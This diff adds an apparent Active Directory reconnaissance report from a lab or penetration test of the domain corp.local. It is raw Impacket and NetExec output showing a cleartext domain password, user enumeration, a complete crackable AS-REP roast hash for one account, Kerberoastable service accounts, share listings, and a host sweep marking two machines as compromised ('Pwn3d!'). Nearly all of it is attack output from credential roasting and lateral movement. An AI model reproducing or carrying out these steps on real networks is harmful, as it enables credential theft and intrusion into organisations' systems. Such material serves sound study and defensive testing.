@@ -1,0 +1,89 @@
+AD Recon Report
+Domain:    corp.local
+User:      j.smith
+Date:      2026-06-05 23:20:02.621052
+==================================================
+
+
+==================================================
+  CREDENCIALES
+==================================================
+SMB                      10.10.10.10     445    WIN-FIAQQKE3IKT  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-FIAQQKE3IKT) (domain:corp.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB                      10.10.10.10     445    WIN-FIAQQKE3IKT  [+] corp.local\j.smith:Password123! 
+
+
+==================================================
+  USUARIOS
+==================================================
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Querying 10.10.10.10 for information about domain.
+Name                  Email                           PasswordLastSet      LastLogon           
+--------------------  ------------------------------  -------------------  -------------------
+Administrator                                         2026-06-04 00:01:48.655850  2026-06-05 20:12:32.526900 
+Guest                                                 <never>              <never>             
+krbtgt                                                2026-06-03 11:09:47.218673  <never>             
+j.smith                                               2026-06-03 11:20:59.878287  2026-06-05 05:39:00.295361 
+m.jones                                               2026-06-03 11:21:00.081239  2026-06-06 01:09:45.869409 
+svc_sql                                               2026-06-03 11:21:00.628406  <never>             
+svc_backup                                            2026-06-05 06:12:52.026385  <never>             
+
+
+==================================================
+  AS-REP ROAST
+==================================================
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Name     MemberOf  PasswordLastSet             LastLogon                   UAC      
+-------  --------  --------------------------  --------------------------  --------
+m.jones            2026-06-03 11:21:00.081239  2026-06-06 01:09:45.869409  0x410200 
+
+
+
+$krb5asrep$23$m.jones@CORP.LOCAL:c77ad4eb6f4c64fefe884b101f050ea7$20c8557c1923c36bdba088a05fa850d4f2759ab4415f3d9fbd9c4d465cc4963813308ba038f413d6729e354f2b5b33d1b31615e3d29a98a22a087bdae0b576a3d3ff30779b626da7d62592b21d39ff606ab25967e733b878b8f22abc99f518dd61cd8fecfe2e883ac95ae7e39534f13ff94f78ec8bae41ff8ad42929449d0ccf9ac6de0ccf433a3e06d42417cb1c2894f1972858451bdcb956094cc0a1ae4d892deeddeaa93866e4430e630af39c514a7e28a378c8f77d2f9a4621a7e5802b24cb48db682940b03cf3e4a90e6c20c0f2efd0d5c0123cc65813052734be2f97ccdfc0326fcb21a43f
+
+
+==================================================
+  KERBEROAST
+==================================================
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName           Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
+-----------------------------  -------  --------  --------------------------  ---------  ----------
+MSSQLSvc/WS02:1433             svc_sql            2026-06-03 11:21:00.628406  <never>               
+MSSQLSvc/WS02.corp.local:1433  svc_sql            2026-06-03 11:21:00.628406  <never>               
+
+
+
+[-] CCache file is not found. Skipping...
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+
+
+==================================================
+  SHARES
+==================================================
+SMB                      10.10.10.10     445    WIN-FIAQQKE3IKT  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-FIAQQKE3IKT) (domain:corp.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB                      10.10.10.10     445    WIN-FIAQQKE3IKT  [+] corp.local\j.smith:Password123! 
+SMB                      10.10.10.10     445    WIN-FIAQQKE3IKT  [*] Enumerated shares
+SMB                      10.10.10.10     445    WIN-FIAQQKE3IKT  Share           Permissions     Remark
+SMB                      10.10.10.10     445    WIN-FIAQQKE3IKT  -----           -----------     ------
+SMB                      10.10.10.10     445    WIN-FIAQQKE3IKT  ADMIN$                          Remote Admin
+SMB                      10.10.10.10     445    WIN-FIAQQKE3IKT  C$                              Default share
+SMB                      10.10.10.10     445    WIN-FIAQQKE3IKT  IPC$            READ            Remote IPC
+SMB                      10.10.10.10     445    WIN-FIAQQKE3IKT  NETLOGON        READ            Logon server share 
+SMB                      10.10.10.10     445    WIN-FIAQQKE3IKT  SYSVOL          READ            Logon server share 
+
+
+==================================================
+  HOSTS
+==================================================
+SMB                      10.10.10.20     445    WIN-PU812JTJF7C  [*] Windows Server 2019 Standard Evaluation 17763 x64 (name:WIN-PU812JTJF7C) (domain:corp.local) (signing:False) (SMBv1:True) (Null Auth:True)
+SMB                      10.10.10.30     445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:corp.local) (signing:False) (SMBv1:None)
+SMB                      10.10.10.10     445    WIN-FIAQQKE3IKT  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-FIAQQKE3IKT) (domain:corp.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB                      10.10.10.20     445    WIN-PU812JTJF7C  [+] corp.local\j.smith:Password123! (Pwn3d!)
+SMB                      10.10.10.30     445    WS01             [+] corp.local\j.smith:Password123! (Pwn3d!)
+SMB                      10.10.10.10     445    WIN-FIAQQKE3IKT  [+] corp.local\j.smith:Password123! 
+SMB                      10.10.10.40     445    WS02             [*] Windows 10 / Server 2019 Build 19041 (name:WS02) (domain:corp.local) (signing:False) (SMBv1:None)
+SMB                      10.10.10.40     445    WS02             [-] corp.local\j.smith:Password123! STATUS_NO_LOGON_SERVERS 
+Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+
